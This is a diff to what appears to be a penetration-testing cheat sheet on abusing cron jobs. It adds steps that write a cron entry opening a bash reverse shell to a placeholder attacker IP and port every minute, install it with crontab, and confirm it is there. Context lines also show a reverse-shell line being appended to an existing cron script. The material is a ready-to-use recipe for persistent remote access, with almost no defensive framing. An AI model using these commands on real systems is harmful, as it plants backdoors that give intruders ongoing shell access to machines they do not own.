@@ -40,3 +40,30 @@ ls -l /path/to/cron_script.sh
 ```bash
 echo "bash -i >& /dev/tcp/attacker_ip/port 0>&1" >> /path/to/cron_script.sh
 ```
+
+
+## Create a new Cron Job
+1. **Create a Cron Job in a File**  
+Use `echo` to define the cron job and redirect it to a file:
+```bash
+echo "* * * * * /bin/bash -c 'bin/bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1'" > <new_file>
+```
+
+2. **Install the Cron Job Using `crontab`**  
+Use the `crontab` command to install the cron job from the file:
+
+```bash
+crontab -i <new_file>
+```
+
+3. **Verify the Cron Job**  
+Check if the cron job was successfully added:
+
+```bash
+crontab -l
+```
+This should display:
+```bash
+* * * * * /bin/bash -c 'bin/bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1'
+```
+
